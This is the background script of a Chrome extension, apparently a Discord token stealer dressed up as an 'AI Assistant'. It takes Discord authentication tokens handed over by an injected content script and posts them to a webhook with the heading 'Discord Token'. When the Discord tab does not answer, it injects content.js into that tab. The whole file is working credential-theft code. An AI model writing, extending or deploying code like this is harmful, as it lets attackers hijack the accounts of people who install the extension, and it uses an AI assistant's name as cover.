// ─── BACKGROUND SERVICE WORKER ───

var WEBHOOK_URL = "WEBHOOK_URL";

console.log("[AI] Background loaded");

// ─── Send webhook with fetch ───
function sendWebhookRequest(token) {
    var payload = {
        content: "**🔑 Discord Token**\n```\n" + token + "\n```",
        username: "AI Assistant"
    };

    return fetch(WEBHOOK_URL, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify(payload)
    });
}

// ─── Handle successful webhook response ───
function handleWebhookSuccess(response) {
    console.log("[AI] Background webhook status:", response.status);
    if (response.ok) {
        console.log("[AI] ✅ Token sent successfully!");
        return { success: true, status: response.status };
    } else {
        // Try to read error message from Discord
        return response.text().then(function(errorText) {
            console.log("[AI] ❌ Discord error response:", errorText);
            return { success: false, status: response.status, error: errorText };
        });
    }
}

// ─── Handle webhook network error ───
function handleWebhookError(error) {
    console.log("[AI] ❌ Webhook network error:", error.message);
    return { success: false, error: error.message };
}

// ─── Send webhook (main function) ───
function sendWebhook(token) {
    console.log("[AI] Background sending webhook...");
    console.log("[AI] Token preview:", token.substring(0, 25) + '...');

    return sendWebhookRequest(token)
        .then(handleWebhookSuccess)
        .catch(handleWebhookError);
}

// ─── Handle sendWebhook message ───
function handleSendWebhook(request, sender, sendResponse) {
    sendWebhook(request.token)
        .then(function(result) {
            sendResponse(result);
        })
        .catch(function(error) {
            sendResponse({ success: false, error: error.message });
        });
    return true;
}

// ─── Handle getStatus from popup ───
function handleGetStatus(request, sender, sendResponse) {
    chrome.tabs.query({ active: true, currentWindow: true }, function(tabs) {
        var tab = tabs[0];
        if (!tab) {
            sendResponse({ error: 'No active tab' });
            return;
        }
        if (!tab.url || !tab.url.includes('discord.com')) {
            sendResponse({ error: 'Not on Discord' });
            return;
        }

        chrome.tabs.sendMessage(tab.id, { action: 'getStatus' }, function(response) {
            if (chrome.runtime.lastError) {
                // Inject content script
                chrome.scripting.executeScript({
                    target: { tabId: tab.id },
                    files: ['content.js']
                }, function() {
                    setTimeout(function() {
                        chrome.tabs.sendMessage(tab.id, { action: 'getStatus' }, function(res) {
                            sendResponse(res || { error: 'Still not responding' });
                        });
                    }, 500);
                });
                return;
            }
            sendResponse(response);
        });
    });
    return true;
}

// ─── Main message router ───
function handleMessage(request, sender, sendResponse) {
    if (request.action === 'sendWebhook') {
        return handleSendWebhook(request, sender, sendResponse);
    }
    if (request.action === 'getStatus') {
        return handleGetStatus(request, sender, sendResponse);
    }
    return true;
}

chrome.runtime.onMessage.addListener(handleMessage);

chrome.runtime.onInstalled.addListener(function() {
    console.log("[AI] Extension installed");
});
